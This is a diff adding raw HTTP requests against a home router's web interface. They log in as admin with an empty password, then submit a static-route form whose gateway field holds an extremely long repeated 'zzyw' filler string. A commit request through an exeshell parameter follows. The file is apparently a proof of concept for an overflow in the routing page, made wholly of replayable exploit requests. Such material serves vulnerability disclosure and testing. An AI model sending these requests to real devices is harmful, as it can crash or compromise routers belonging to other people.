@@ -1,0 +1,61 @@
+POST /login.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 63
+Cache-Control: max-age=0
+Origin: http://192.168.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ACTION_POST=LOGIN&LOGIN_USER=admin&LOGIN_PASSWD=&login=+Log+In+POST /set_temp_nodes.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 934
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/adv_routing.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+TEMP_NODES=/runtime/post/session_1&data=5&start=1&d_1_0=1&d_1_1=WAN&d_1_2=192.68.0.34&d_1_3=255.255.255.255&d_1_4=192.68.0.89&d_2_0=1&d_2_1=WAN&d_2_2=192.68.0.zzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyw5&d_2_3=255.255.255.255&d_2_4=192.68.0.90&d_3_0=1&d_3_1=WAN&d_3_2=192.68.0.12&d_3_3=255.255.255.255&d_3_4=192.68.0.64&d_4_0=&d_4_1=&d_4_2=&d_4_3=&d_4_4=&d_5_0=&d_5_1=&d_5_2=&d_5_3=&d_5_4=&d_6_0=&d_6_1=&d_6_2=&d_6_3=&d_6_4=&d_7_0=&d_7_1=&d_7_2=&d_7_3=&d_7_4=&d_8_0=&d_8_1=&d_8_2=&d_8_3=&d_8_4=&d_9_0=&d_9_1=&d_9_2=&d_9_3=&d_9_4=&d_10_0=&d_10_1=&d_10_2=&d_10_3=&d_10_4=&d_11_0=&d_11_1=&d_11_2=&d_11_3=&d_11_4=&d_12_0=&d_12_1=&d_12_2=&d_12_3=&d_12_4=&d_13_0=&d_13_1=&d_13_2=&d_13_3=&d_13_4=&d_14_0=&d_14_1=&d_14_2=&d_14_3=&d_14_4=&d_15_0=&d_15_1=&d_15_2=&d_15_3=&d_15_4=&d_16_0=&d_16_1=&d_16_2=&d_16_3=&d_16_4=&d_17_0=&d_17_1=&d_17_2=&d_17_3=&d_17_4=&d_18_0=&d_18_1=&d_18_2=&d_18_3=&d_18_4=&d_19_0=&d_19_1=&d_19_2=&d_19_3=&d_19_4=&d_20_0=&d_20_1=&d_20_2=&d_20_3=&d_20_4=&end=20POST /adv_routing.php HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Content-Length: 21
+Cache-Control: max-age=0
+Origin: http://192.168.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_routing.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+ACTION_POST=SOMETHINGGET /adv_routing.xgi?random_num=2025.5.22.15.43.46&exeshell=submit%20COMMIT&exeshell=submit%20ROUTE HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_routing.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+GET /adv_routing.php?uptime=120&random_num=2025.5.22.15.43.46 HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.0.1/adv_routing.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
